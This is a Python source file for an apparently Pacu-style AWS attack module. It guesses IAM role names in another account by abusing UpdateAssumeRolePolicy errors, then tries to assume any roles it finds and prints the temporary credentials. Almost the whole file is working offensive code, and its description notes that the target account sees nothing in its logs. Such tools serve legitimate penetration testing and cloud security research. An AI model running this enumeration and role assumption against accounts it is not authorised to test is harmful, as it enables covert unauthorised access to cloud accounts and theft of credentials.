#!/usr/bin/env python3
import argparse
import botocore
import random
import string


module_info = {
    'name': 'iam__enum_roles',

    'author': 'Spencer Gietzen of Rhino Security Labs',

    'category': 'RECON_UNAUTH',

    'one_liner': 'Enumerates IAM roles in a separate AWS account, given the account ID.',

    'description': 'This module takes in a valid AWS account ID and tries to enumerate existing IAM roles within that account. It does so by trying to update the AssumeRole policy document of the role that you pass into --role-name. For your safety, it updates the policy with an explicit deny against the AWS account/IAM role, so that no security holes are opened in your account during enumeration. NOTE: It is recommended to use personal AWS access keys for this script, as it will spam CloudTrail with "iam:UpdateAssumeRolePolicy" logs and a few "sts:AssumeRole" logs. The target account will not see anything in their logs though, unless you find a misconfigured role that allows you to assume it. The keys used must have the iam:UpdateAssumeRolePolicy permission on the role that you pass into --role-name to be able to identify a valid IAM role and the sts:AssumeRole permission to try and request credentials for any enumerated roles.',

    'services': ['IAM', 'STS'],

    'prerequisite_modules': [],

    'external_dependencies': [],

    'arguments_to_autocomplete': ['--word-list', '--role-name', '--account-id']
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--word-list', required=False, default=None, help='File path to a different word list to use. There is a default word list with 1100+ words. The word list should contain words, one on each line, to use to try and guess IAM role names. Role names ARE case-sensitive.')
parser.add_argument('--role-name', required=True, help='The name of a valid role in the current users account to try and update the AssumeRole policy document for.')
parser.add_argument('--account-id', required=True, help='The AWS account ID of the target account (12 numeric characters).')


def main(args, pacu_main):
    args = parser.parse_args(args)
    print = pacu_main.print

    if not len(args.account_id) == 12 or not args.account_id.isdigit():
        print('Error: An AWS account ID is a number of length 12. You supplied: {}\n'.format(args.account_id))
        return None

    if args.word_list is None:
        word_list_path = './modules/{}/default-word-list.txt'.format(module_info['name'])
    else:
        word_list_path = args.word_list.strip()

    with open(word_list_path, 'r') as f:
        word_list = f.read().splitlines()

    print('Warning: This script does not check if the keys you supplied have the correct permissions. Make sure they are allowed to use iam:UpdateAssumeRolePolicy on the role that you pass into --role-name and are allowed to use sts:AssumeRole to try and assume any enumerated roles!\n')

    data = {
        'attempts': 0,
        'valid_roles': [],
        'roles_assumed': []
    }

    client = pacu_main.get_boto3_client('iam')

    print('Targeting account ID: {}\n'.format(args.account_id))
    print('Starting role enumeration...\n')

    for word in word_list:
        role_arn = 'arn:aws:iam::{}:role/{}'.format(args.account_id, word)

        data['attempts'] += 1

        try:
            client.update_assume_role_policy(
                RoleName=args.role_name,
                PolicyDocument='{{"Version":"2012-10-17","Statement":[{{"Effect":"Deny","Principal":{{"AWS":"{}"}},"Action":"sts:AssumeRole"}}]}}'.format(role_arn)
            )
            print('  Found role: {}'.format(role_arn))
            data['valid_roles'].append(role_arn)
        except botocore.exceptions.ClientError as error:
            if 'MalformedPolicyDocument' in str(error):
                # Role doesn't exist, continue on
                pass
            elif 'NoSuchEntity' in str(error):
                print('  Error: You did not pass in a valid role name. An existing role is required for this script.')
                return data
            else:
                print('  Unhandled error: {}'.format(str(error)))
                return data

    if len(data['valid_roles']) > 0:
        print('\nFound {} role(s):\n'.format(len(data['valid_roles'])))
        for role in data['valid_roles']:
            print('    {}'.format(role))
        print()

        print('Checking to see if any of these roles can be assumed for temporary credentials...\n')
        client = pacu_main.get_boto3_client('sts')
        for role in data['valid_roles']:
            try:
                response = client.assume_role(
                    RoleArn=role,
                    RoleSessionName=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20)),
                    DurationSeconds=43200
                )

                print('  Successfully assumed role for 12 hours: {}\n'.format(role))

                response.pop('ResponseMetadata', None)
                print(response)

                data['roles_assumed'].append(role)
            except botocore.exceptions.ClientError as error:
                if 'The requested DurationSeconds exceeds the MaxSessionDuration set for this role.' in str(error):
                    # Can assume the role, but requested more time than the max allowed for it
                    print('  Role can be assumed, but hit max session time limit, reverting to minimum of 1 hour...\n')

                    response = client.assume_role(
                        RoleArn=role,
                        RoleSessionName=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20)),
                        DurationSeconds=3600
                    )

                    print('  Successfully assumed role for 1 hour: {}\n'.format(role))

                    response.pop('ResponseMetadata', None)
                    print(response)

                    data['roles_assumed'].append(role)

    return data


def summary(data, pacu_main):
    results = []

    results.append('  {} role(s) found after {} guess(es).'.format(len(data['valid_roles']), data['attempts']))

    if len(data['valid_roles']) > 0:
        results.append('  {} out of {} enumerated role(s) successfully assumed.'.format(len(data['roles_assumed']), len(data['valid_roles'])))

    return '\n'.join(results)
